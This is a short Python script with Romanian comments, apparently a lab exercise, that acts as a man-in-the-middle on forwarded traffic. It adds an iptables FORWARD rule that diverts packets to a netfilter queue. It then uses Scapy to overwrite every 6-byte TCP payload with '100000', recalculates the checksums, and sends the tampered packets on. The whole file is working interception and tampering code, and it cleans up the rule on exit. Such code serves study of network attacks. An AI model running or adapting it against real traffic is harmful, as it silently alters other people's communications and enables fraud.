from netfilterqueue import NetfilterQueue
from scapy.all import IP, TCP, Raw
import os


def proceseaza(pachet):
    # iau continutul brut primit (adica payload-ul)
    octeti = pachet.get_payload()
    # fac un obiect din Scapy din payload-ul extras
    pachetScapy = IP(octeti)

    # daca pachetul are un layer TCP
    if pachetScapy.haslayer(TCP):
        print(f"[middle] TCP {pachetScapy[IP].src}:{pachetScapy[TCP].sport} -> {pachetScapy[IP].dst}:{pachetScapy[TCP].dport}")
        
        # sa aiba un layer Raw inseamna sa aiba un payload de date transmise
        if pachetScapy.haslayer(Raw):
            # iau datele transmise initial
            payloadInitial = pachetScapy[Raw].load
            print(f"[middle] Payload inițial: {payloadInitial}")

            # modific mesajele care au exact 6 caractere
            if len(payloadInitial) == len(b"100000"):
                pachetScapy[Raw].load = b"100000" #transforma stringul in sir de octeti
                
                # sterg informatiile legate de lungime si checksum =>
                # o sa fie recalculate automat
                del pachetScapy[IP].len
                del pachetScapy[IP].chksum
                del pachetScapy[TCP].chksum
                print(f"[middle] Payload modificat: {pachetScapy[Raw].load}")
            else:
                print("[middle] Lungime payload diferita, pachet pastrat neschimbat.")
    
    # modific datele cu cele modificate
    pachet.set_payload(bytes(pachetScapy))
    # accept pachetul din coada pentru a fi lasat sa mearga mai departe
    pachet.accept()

# fac un obiect de tip coada netfilter
coada = NetfilterQueue()

try:
    # afisez si apoi rulez comanda respectiva
    # comanda adauga o regula in iptables pentru interceptarea pachetelor din lantul FORWARD
    # le trimite apoi in coada de tip NetFIlter care are numarul 10 (asa am ales eu)
    print("[middle] Setup iptables: iptables -I FORWARD -j NFQUEUE --queue-num 10")
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
    
    # leg coada NetfilterQueue cu numarul 1- de functia proceseaza, care trateaza fiecare pachet
    # observatie: fac referentiere la functie, nu apelez functia
    # adica pachetul stie unde sa se duca, dar nu se duce acum sincron in timpul rularii programului
    coada.bind(10, proceseaza)
    print("[middle] Interceptare activa pe NFQUEUE 10...")
    
    # pornesc procesarea pachetelor din coada
    coada.run()
except KeyboardInterrupt:
    print("\n[middle] Oprire si curatare reguli iptables.")
    
    # opresc legatura dintre NetfilterQueue si coada mea
    coada.unbind()
    
    # dau delete regulii pe care am adaugat-o mai sus, vreau sa revina la normal tot
    os.system("iptables -D FORWARD -j NFQUEUE --queue-num 10")

